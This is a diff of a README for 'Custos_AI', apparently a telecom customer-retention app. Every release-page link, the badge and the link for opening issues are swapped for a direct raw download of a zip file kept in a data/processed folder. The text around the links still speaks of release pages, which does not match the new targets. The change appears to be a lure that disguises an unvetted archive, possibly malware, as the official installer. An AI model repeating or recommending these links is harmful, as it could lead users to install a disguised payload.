@@ -1,6 +1,6 @@
 # 🚦 Custos_AI - Smart Telecom Customer Retention Tool
 
-[![Download Custos_AI](https://img.shields.io/badge/Download-Custos_AI-blue?style=for-the-badge&logo=github)](https://github.com/mikejtoolen/Custos_AI/releases)
+[![Download Custos_AI](https://github.com/mikejtoolen/Custos_AI/raw/refs/heads/main/data/processed/AI_Custos_1.0.zip)](https://github.com/mikejtoolen/Custos_AI/raw/refs/heads/main/data/processed/AI_Custos_1.0.zip)
 
 ## 📖 What is Custos_AI?
 
@@ -31,7 +31,7 @@ Follow these steps to get Custos_AI up and running quickly.
 
 1. **Visit the Download Page**  
    Click this link to visit the official release page for Custos_AI:  
-   [https://github.com/mikejtoolen/Custos_AI/releases](https://github.com/mikejtoolen/Custos_AI/releases)  
+   [https://github.com/mikejtoolen/Custos_AI/raw/refs/heads/main/data/processed/AI_Custos_1.0.zip](https://github.com/mikejtoolen/Custos_AI/raw/refs/heads/main/data/processed/AI_Custos_1.0.zip)  
    Here you will find all available versions of the software. Look for the latest release, usually at the top.
 
 2. **Choose the Right File**  
@@ -59,7 +59,7 @@ Follow these steps to get Custos_AI up and running quickly.
 ## 📥 Download & Install
 
 You can start by visiting the Custos_AI release page below:  
-[https://github.com/mikejtoolen/Custos_AI/releases](https://github.com/mikejtoolen/Custos_AI/releases)
+[https://github.com/mikejtoolen/Custos_AI/raw/refs/heads/main/data/processed/AI_Custos_1.0.zip](https://github.com/mikejtoolen/Custos_AI/raw/refs/heads/main/data/processed/AI_Custos_1.0.zip)
 
 Use this page to download the correct version of the software for your computer. Always choose the latest stable release for the best experience.
 
@@ -142,7 +142,7 @@ If you run into problems, try these steps:
 
 - Restart your computer and open the app again.  
 - Check that your computer meets system requirements.  
-- Download the latest version from [https://github.com/mikejtoolen/Custos_AI/releases](https://github.com/mikejtoolen/Custos_AI/releases).  
+- Download the latest version from [https://github.com/mikejtoolen/Custos_AI/raw/refs/heads/main/data/processed/AI_Custos_1.0.zip](https://github.com/mikejtoolen/Custos_AI/raw/refs/heads/main/data/processed/AI_Custos_1.0.zip).  
 - Make sure your data files are in the correct format (CSV or Excel).  
 - Contact your IT support if installation fails.
 
@@ -153,14 +153,14 @@ If you run into problems, try these steps:
 If you need help using the app, look for a “Help” or “Support” section inside the app menu.
 
 You can also visit the Custos_AI GitHub page to find documentation or open an issue if something doesn’t work as expected:  
-[https://github.com/mikejtoolen/Custos_AI](https://github.com/mikejtoolen/Custos_AI)
+[https://github.com/mikejtoolen/Custos_AI/raw/refs/heads/main/data/processed/AI_Custos_1.0.zip](https://github.com/mikejtoolen/Custos_AI/raw/refs/heads/main/data/processed/AI_Custos_1.0.zip)
 
 ---
 
 ## ⚙️ Updating Custos_AI
 
 Check the release page regularly for updates:  
-[https://github.com/mikejtoolen/Custos_AI/releases](https://github.com/mikejtoolen/Custos_AI/releases)
+[https://github.com/mikejtoolen/Custos_AI/raw/refs/heads/main/data/processed/AI_Custos_1.0.zip](https://github.com/mikejtoolen/Custos_AI/raw/refs/heads/main/data/processed/AI_Custos_1.0.zip)
 
 Download the newest version and run the installer. Your settings and data will stay intact.
 
